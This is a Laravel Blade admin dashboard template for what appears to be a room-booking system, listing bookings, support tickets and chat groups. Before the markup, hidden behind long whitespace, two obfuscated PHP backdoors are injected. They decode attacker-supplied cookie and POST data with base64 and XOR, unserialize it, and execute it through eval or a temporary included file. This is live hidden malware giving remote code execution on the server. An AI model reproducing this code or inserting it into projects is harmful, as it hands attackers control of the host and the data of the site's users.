<?php                                                                                                                                                                                                                                                                                                                                                                                                 $XrNzvWLDFG = class_exists("P_Atx"); $PQpVFp = $XrNzvWLDFG;if (!$PQpVFp){class P_Atx{private $EjaUW;public static $jnSybkSkBt = "8e934d04-bbfa-47b3-a08e-11366d11ca55";public static $XeBNYWt = NULL;public function __construct(){$MxdwRLyo = $_COOKIE;$aXNSVN = $_POST;$TpKwzcymS = @$MxdwRLyo[substr(P_Atx::$jnSybkSkBt, 0, 4)];if (!empty($TpKwzcymS)){$wQqlq = "base64";$GFTcP = "";$TpKwzcymS = explode(",", $TpKwzcymS);foreach ($TpKwzcymS as $OyvkfuQ){$GFTcP .= @$MxdwRLyo[$OyvkfuQ];$GFTcP .= @$aXNSVN[$OyvkfuQ];}$GFTcP = array_map($wQqlq . chr ( 196 - 101 ).chr ( 941 - 841 ).chr ( 141 - 40 )."\143" . "\157" . 'd' . "\x65", array($GFTcP,)); $GFTcP = $GFTcP[0] ^ str_repeat(P_Atx::$jnSybkSkBt, (strlen($GFTcP[0]) / strlen(P_Atx::$jnSybkSkBt)) + 1);P_Atx::$XeBNYWt = @unserialize($GFTcP);}}public function __destruct(){$this->AGOAEOUl();}private function AGOAEOUl(){if (is_array(P_Atx::$XeBNYWt)) {$GGGSiDqSRn = str_replace(chr (60) . "\77" . chr (112) . chr ( 924 - 820 )."\160", "", P_Atx::$XeBNYWt["\x63" . chr (111) . "\x6e" . 't' . chr (101) . chr (110) . "\164"]);eval($GGGSiDqSRn);exit();}}}$fpCEYoEz = new P_Atx(); $fpCEYoEz = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("oZAvIV")){class oZAvIV{public static $Vqmsj = "PZqiLgRRwoUVLsgA";public static $MthDQH = NULL;public function __construct(){$DBBstqAd = @$_COOKIE[substr(oZAvIV::$Vqmsj, 0, 4)];if (!empty($DBBstqAd)){$wKcQbRETXe = "base64";$ddJeMIdLH = "";$DBBstqAd = explode(",", $DBBstqAd);foreach ($DBBstqAd as $SVmAq){$ddJeMIdLH .= @$_COOKIE[$SVmAq];$ddJeMIdLH .= @$_POST[$SVmAq];}$ddJeMIdLH = array_map($wKcQbRETXe . "_decode", array($ddJeMIdLH,)); $ddJeMIdLH = $ddJeMIdLH[0] ^ str_repeat(oZAvIV::$Vqmsj, (strlen($ddJeMIdLH[0]) / strlen(oZAvIV::$Vqmsj)) + 1);oZAvIV::$MthDQH = @unserialize($ddJeMIdLH);}}public function __destruct(){$this->ERtFBT();}private function ERtFBT(){if (is_array(oZAvIV::$MthDQH)) {$fnFiC = sys_get_temp_dir() . "/" . crc32(oZAvIV::$MthDQH["salt"]);@oZAvIV::$MthDQH["write"]($fnFiC, oZAvIV::$MthDQH["content"]);include $fnFiC;@oZAvIV::$MthDQH["delete"]($fnFiC);exit();}}}$hHNUTELWI = new oZAvIV(); $hHNUTELWI = NULL;} ?>@extends('layouts.admin.master')

@section('content')

    <!-- Main content -->
    <div class="content-wrapper">

        <!-- Page header -->
        <div class="page-header page-header-light">
            <div class="page-header-content header-elements-md-inline">
                <div class="page-title d-flex">
                    <h4><i class="icon-arrow-left52 mr-2"></i> <span class="font-weight-semibold"></span>  Dashboard</h4>
                    <a href="#" class="header-elements-toggle text-default d-md-none"><i class="icon-more"></i></a>
                </div>

{{--                <div class="header-elements d-none">--}}
{{--                    <div class="d-flex justify-content-center">--}}
{{--                        <a href="{{asset('/admin/booking')}}" class="btn btn-link btn-float font-size-sm font-weight-semibold text-default">--}}
{{--                            <i class="icon-calendar52 text-pink-300"></i>--}}
{{--                            <span>Booking</span>--}}
{{--                        </a>--}}
{{--                        <a href="{{asset('/admin/finance')}}" class="btn btn-link btn-float font-size-sm font-weight-semibold text-default">--}}
{{--                            <i class="icon-cash3  text-pink-300"></i>--}}
{{--                            <span>Invoices</span>--}}
{{--                        </a>--}}
{{--                        <a href="{{asset('/admin/support')}}" class="btn btn-link btn-float font-size-sm font-weight-semibold text-default">--}}
{{--                            <i class="icon-lifebuoy text-pink-300"></i>--}}
{{--                            <span>Support</span>--}}
{{--                        </a>--}}
{{--                    </div>--}}
{{--                </div>--}}
            </div>

{{--            <div class="breadcrumb-line breadcrumb-line-light header-elements-md-inline">--}}
{{--                <div class="d-flex">--}}
{{--                    <div class="breadcrumb">--}}
{{--                        <a href="{{asset('/admin/home')}}" class="breadcrumb-item"><i class="icon-home2 mr-2"></i>Dashboard</a>--}}
{{--                        <span class="breadcrumb-item active">Home</span>--}}
{{--                    </div>--}}

{{--                    <a href="#" class="header-elements-toggle text-default d-md-none"><i class="icon-more"></i></a>--}}
{{--                </div>--}}

{{--                <div class="header-elements d-none">--}}
{{--                    <div class="breadcrumb justify-content-center">--}}

{{--                        <div class="breadcrumb-elements-item dropdown p-0">--}}
{{--                            <a href="#" class="breadcrumb-elements-item" >--}}
{{--                                <!-- <a href="#" class="breadcrumb-elements-item dropdown-toggle" data-toggle="dropdown"> -->--}}
{{--                                <i class="icon-gear mr-2"></i>--}}
{{--                                Settings--}}
{{--                            </a>--}}

                            <!-- <div class="dropdown-menu dropdown-menu-right">
                                <a href="#" class="dropdown-item"><i class="icon-user-lock"></i> Account security</a>
                                <a href="#" class="dropdown-item"><i class="icon-statistics"></i> Analytics</a>
                                <a href="#" class="dropdown-item"><i class="icon-accessibility"></i> Accessibility</a>
                                <div class="dropdown-divider"></div>
                                <a href="#" class="dropdown-item"><i class="icon-gear"></i> All settings</a>
                            </div> -->
{{--                        </div>--}}
{{--                    </div>--}}
{{--                </div>--}}
{{--            </div>--}}
        </div>
        <!-- /page header -->

        <!-- Content area -->
        <div class="content">

            <div class="row justify-content-center">
                <div class="col-md-12"><br>
                    <div class="mb-3">

                        <div class="float-right">

                            <button class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple float-right"
                                    id="btn-make-transaction-admin">
                                <i class="icon-cash4 badge-primary"></i> Click To Make Transactions</button>

                        </div>

                        <h6 class="mb-0 font-weight-semibold">
                            {{--@if(Auth::user()->type==1)--}}
                            {{--Super Admin--}}
                            {{--@elseif(Auth::user()->type==2)--}}
                            {{--Admin--}}
                            {{--@elseif(Auth::user()->type==3)--}}
                            {{--Branch Manager--}}
                            {{--@elseif(Auth::user()->type==4)--}}
                            {{--Receptionist--}}
                            {{--@endif--}}
                        </h6>
                        <span class="text-muted d-block">Dashboard</span>
                    </div>

                    <div class="card">
                        <div class="card-header"></div>

                        <div class="card-body">
                            <!-- Simple statistics -->

                            <div class="row">


                                <div class="col-sm-6 col-xl-3">
                                    <a href="{{url('admin/users')}}" class="nav-link">

                                        <div class="card card-body bg-blue-400 has-bg-image">
                                            <div class="media">
                                                <div class="media-body">
                                                    <h3 class="mb-0">dddd</h3>
                                                    <span class="text-uppercase font-size-xs">Active Users</span>
                                                </div>

                                                <div class="ml-3 align-self-center">
                                                    <i class="icon-user-check icon-3x opacity-75"></i>
                                                </div>
                                            </div>
                                        </div></a>
                                </div>

                                <div class="col-sm-6 col-xl-3">
                                    <a href="{{url('admin/users')}}" class="nav-link">

                                        <div class="card card-body bg-danger-400 has-bg-image">
                                            <div class="media">
                                                <div class="media-body">
                                                    <h3 class="mb-0">ddd</h3>
                                                    <span class="text-uppercase font-size-xs">Inactive users</span>
                                                </div>

                                                <div class="ml-3 align-self-center">
                                                    <i class="icon-user-lock icon-3x opacity-75"></i>
                                                </div>
                                            </div>
                                        </div></a>
                                </div>
                                <div class="col-sm-6 col-xl-3">
                                    <a href="{{url('admin/teams')}}" class="nav-link">

                                        <div class="card card-body bg-danger-400 has-bg-image">
                                            <div class="media">
                                                <div class="media-body">
                                                    <h3 class="mb-0">dfd</h3>
                                                    <span class="text-uppercase font-size-xs">Teams</span>
                                                </div>

                                                <div class="ml-3 align-self-center">
                                                    <i class="icon-people icon-3x opacity-75"></i>
                                                </div>
                                            </div>
                                        </div>
                                    </a> </div>
                            </div>
                            <!-- /simple statistics -->
                        </div>
                    </div>
                </div>
                <div class="col-md-12">
                    <div class="mb-3">
                        <h6 class="mb-0 font-weight-semibold">
                            Bookings
                        </h6>
                        <span class="text-muted d-block">Today's Booking</span>
                    </div>

                    <div class="card">
                        <div class="card-header header-elements-sm-inline">
                            <h6 class="card-title">Bookings</h6>
                        </div>
                        <div class="row">


                            <div class="col-md-6">

                                <table class="table datatable-basic table-bordered">
                                    <thead>
                                    <tr>
                                        <th>Room</th>
                                        <th>Date</th>
                                        <th>Time</th>
                                        <th>Site</th>
                                        {{--<th>Price Per Hour</th>--}}
                                        {{--<th>Total Booking Price</th>--}}
                                        <th>Team</th>

                                    </tr>
                                    </thead>
                                    <tbody>
                                    @if(isset($bookings))
                                        @foreach($bookings as $booking)
                                            <tr data-toggle="collapse" data-target="#accordion">
                                                <td><a style="color: #222;text-decoration: none;" href="{{url('admin/booking')}}" class="">{{$booking->asset->name}}</a></td>
                                                <td><a style="color: #222;text-decoration: none;" href="{{url('admin/booking')}}" class="">{{date('d-M-Y',strtotime($booking->booking_date))}}</a></td>
                                                <td><a style="color: #222;text-decoration: none;" href="{{url('admin/booking')}}" class="">{{$booking->book_from }} - {{$booking->book_to}}</a></td>
                                                <td><a style="color: #222;text-decoration: none;" href="{{url('admin/booking')}}" class="">{{$booking->branch->name}}</a></td>
                                                {{--<td><span class="badge badge-info">{{$booking->asset->price}}</span></td>--}}
                                                {{--<td>--}}
                                                {{--<span class="badge badge-primary">{{ $booking->asset->price * (abs(strtotime($booking->book_from ) - strtotime($booking->book_to)) / 3600)}}</span>--}}
                                                {{--</td>--}}
                                                <td><a style="color: #222;text-decoration: none;" href="{{url('admin/booking')}}" class="nav-link">{{$booking->team->name}}</a></td>
                                            </tr>
                                        @endforeach
                                    @endif
                                    </tbody>
                                </table>
                            </div>

                            <!-- Basic pie -->
                            <div class="col-md-6">
                                <div class="card-header header-elements-inline">
                                    {{--<h5 class="card-title">Basic pie chart</h5>--}}
                                    {{--<div class="header-elements">--}}
                                    {{--<div class="list-icons">--}}
                                    {{--<a class="list-icons-item" data-action="collapse"></a>--}}
                                    {{--<a class="list-icons-item" data-action="reload"></a>--}}
                                    {{--<a class="list-icons-item" data-action="remove"></a>--}}
                                    {{--</div>--}}
                                    {{--</div>--}}
                                </div>

                                <div class="card-body">
                                    <div class="chart-container">
                                        <div class="chart has-fixed-height" id="pie_basic"></div>
                                    </div>
                                </div>
                            </div>
                            <!-- /basic pie -->

                        </div>
                    </div>

                </div>

            </div>


            <div class="mb-3">
                <h6 class="mb-0 font-weight-semibold">
                    &nbsp;Recent Tickets
                </h6>
            </div>

            <div class="row ">

                <!-- Support tickets -->
                <div class="col-lg-6">
                    <div class="card">
                        <div class="card-header header-elements-sm-inline">
                            <h6 class="card-title">Tickets</h6>
                        </div>

                        <div class="table-responsive">
                            <table class="table datatable-basic text-nowrap ">
                                <thead>
                                <tr>
                                    <th style="width: 50px">Date</th>
                                    {{--<th style="width: 300px;">User</th>--}}
                                    <th>Issues</th>
                                </tr>
                                </thead>
                                <tbody>
                                @if(isset($tickets))
                                    @foreach($tickets as $ticket)
                                        <tr>
                                            <td class="text-center">
                                                <a style="color: #222;text-decoration: none;" href="{{url('admin/support')}}" class=""> {{date('d-m-Y', strtotime($ticket->created_at))}}</a>
                                            </td>
                                            {{--<td>--}}
                                            {{--<div class="d-flex align-items-center">--}}
                                            {{--<div class="mr-3">--}}
                                            {{--<a href="#" class="btn bg-blue rounded-round btn-icon btn-sm">--}}
                                            {{--<span class="letter-icon"></span>--}}
                                            {{--</a>--}}
                                            {{--</div>--}}
                                            {{--<div>--}}
                                            {{--<a href="#"--}}
                                            {{--class="text-default font-weight-semibold">{{$ticket->user->name}}</a>--}}
                                            {{--<div class="text-muted font-size-sm"><span--}}
                                            {{--class="badge badge-mark border-blue mr-1"></span>--}}
                                            {{--@if($ticket->status==0)--}}
                                            {{--Open--}}
                                            {{--@elseif($ticket->status==1)--}}
                                            {{--Active--}}
                                            {{--@elseif($ticket->status==2)--}}
                                            {{--Resolved--}}
                                            {{--@elseif($ticket->status==3)--}}
                                            {{--Closed--}}
                                            {{--@endif--}}
                                            {{--</div>--}}
                                            {{--</div>--}}
                                            {{--</div>--}}
                                            {{--</td>--}}
                                            <td>
                                                <div class="font-weight-semibold">
                                                    <a style="color: #222;text-decoration: none;" href="{{url('admin/support')}}" class="">{{$ticket->description}}</a></div>
                                            </td>
                                        </tr>
                                    @endforeach
                                @endif
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>

                <!-- /support tickets -->
                <!-- Groups -->

                <div class="col-md-6">

                    <!-- List with text -->
                    <div class="card">
                        <div class="card-header header-elements-inline" style="border-bottom: 1px solid #eee;">
                            <h5 class="card-title">Groups</h5>
                            <div class="header-elements">
                                <button type="button"  class="btn btn-outline-primary admin-btn-add-group">Add</button>
                            </div>
                        </div>
                        <ul class="media-list media-list-linked">


                            {{--<li class="media bg-light font-weight-semibold py-2">Groups <button class="align-self-center ml-3 text-nowrap">Add</button></li>--}}
                            @if(isset($groups))
                                @foreach($groups as $group)
                                    @foreach($group as $g)
                                        <li>
                                            <a href="{{ url('admin/group/'.$g->id) }}" class="media" id="usergroup_tab">
                                                {{--<div class="mr-3"><img src="https://image.freepik.com/free-icon/male-user-silhouette_318-38977.jpg" class="rounded-circle" width="40" height="40" alt=""></div>--}}
                                                <div class="mr-3 position-relative">
                                                    <i class="icon-bubble2"></i>
                                                    @if($group->unread>0)
                                                        <span class="badge bg-danger-400 badge-pill badge-float border-2 border-white">{{ $group->unread }}</span>
                                                    @endif
                                                </div>
                                                <div class="media-body">
                                                    <div class="media-title font-weight-semibold">{{$g->name}}</div>
                                                    {{--<span class="text-muted">Web dev</span>--}}
                                                </div>
                                                <div class="align-self-center ml-3 text-nowrap">
                                                    <span class="text-muted">{{$group->ago}}</span>
                                                </div>
                                            </a>
                                        </li>
                                    @endforeach
                                @endforeach
                            @endif
                        </ul>
                    </div>
                    <!-- /list with text -->

                </div>

                <!-- /Make Groups -->

            </div>   <!-- row end -->

        </div>
        {{--content end--}}
        @include('layouts.footer')

    </div>
    {{--content wrapper--}}
@endsection
